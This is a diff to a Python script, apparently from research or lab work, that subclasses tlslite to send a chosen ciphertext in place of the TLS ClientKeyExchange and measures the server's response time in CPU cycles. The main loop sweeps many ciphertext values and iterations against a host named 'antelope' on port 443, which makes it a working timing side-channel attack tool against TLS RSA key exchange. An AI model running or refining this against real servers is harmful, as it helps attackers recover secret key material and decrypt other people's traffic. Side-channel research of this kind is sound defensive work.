@@ -1,6 +1,9 @@
+import argparse
 import gc
 import socket
 import tlslite
+import rdtsc
+import sympy
 
 
 from tlslite.handshakesettings import HandshakeSettings
@@ -26,8 +29,9 @@ class AttackTLSConnection(tlslite.TLSConnection):
     function with one that sends a predetermined ciphertext, g, instead of
     the ClientKeyExchange message.
 
-    It also ... times the time taken for the server to respond and returns
-    this value to the caller of performHandshakeAttack().
+    It also measures the CPU clock cycles taken for the server to
+    respond and returns this value to the caller of
+    performHandshakeAttack().
     """
 
     def performHandshakeAttack(self, g):
@@ -104,6 +108,9 @@ class AttackTLSConnection(tlslite.TLSConnection):
         )
         # </naughty code>
 
+        # Start time
+        start_time = rdtsc.get_cycles()
+
         # Continue the process as normal...
         for result in self._clientKeyExchange(
             settings,
@@ -116,7 +123,7 @@ class AttackTLSConnection(tlslite.TLSConnection):
             serverHello.random,
             keyExchange,
         ):
-            print(repr(result))
+            pass
 
         premasterSecret, serverCertChain, clientCertChain, tackExt = result
 
@@ -129,26 +136,38 @@ class AttackTLSConnection(tlslite.TLSConnection):
                 settings.cipherImplementations,
                 None,
             ):
-                print(repr(result))
+                pass
+
             masterSecret = result
 
             return False
 
         except tlslite.errors.TLSRemoteAlert:
-            return True
+            end_time = rdtsc.get_cycles()
+            return start_time, end_time
 
 
 if __name__ == "__main__":
+    parser = argparse.ArgumentParser()
+    parser.add_argument("start", type=int, default=1)
+    parser.add_argument("end", type=int, default=100)
+    parser.add_argument("step", type=int, default=1)
+    parser.add_argument("iterations", type=int, default=100)
+    args = parser.parse_args()
+
     gc.disable()
+    gc.collect()
 
-    for index in range(10):
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.connect(("antelope", 443))
+    for index in range(args.start, args.end + 1, args.step):
+        for iteration in range(args.iterations):
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.connect(("antelope", 443))
 
-        connection = AttackTLSConnection(sock)
-        connection.performHandshakeAttack(100 * index)
+            connection = AttackTLSConnection(sock)
+            start_time, end_time = connection.performHandshakeAttack(index)
+            print(index, iteration, start_time, end_time, end_time - start_time)
 
-        connection.close()
-        sock.close()
+            connection.close()
+            sock.close()
 
-        gc.collect()
+            gc.collect()
